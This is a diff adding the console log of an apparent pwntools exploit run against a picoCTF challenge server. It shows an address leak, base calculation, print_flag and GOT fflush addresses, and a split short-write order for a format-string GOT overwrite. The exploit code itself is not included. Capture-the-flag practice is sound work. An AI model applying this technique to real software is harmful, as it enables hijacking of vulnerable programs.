@@ -1,0 +1,18 @@
+[x] Opening connection to shape-facility.picoctf.net on port 64633
+[x] Opening connection to shape-facility.picoctf.net on port 64633: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 64633: Done
+[*] Leak: b'0x5f20d0583413'
+[*] Base: 0x5f20d0582000
+[*] print_flag: 0x5f20d0583269
+[*] GOT fflush: 0x5f20d0585fb8
+[*] Shorts: 0x3269, 0xd058, 0x5f20
+[*] Write order: [('0x3269', 6), ('0x5f20', 8), ('0xd058', 7)]
+[*] Payload: 60 bytes
+[x] Receiving all data
+[x] Receiving all data: 0B
+[x] Receiving all data: 33B
+[+] Receiving all data: Done (33B)
+[*] Closed connection to shape-facility.picoctf.net port 64633
+
+[*] Response:
+You heard in the distance: _X _
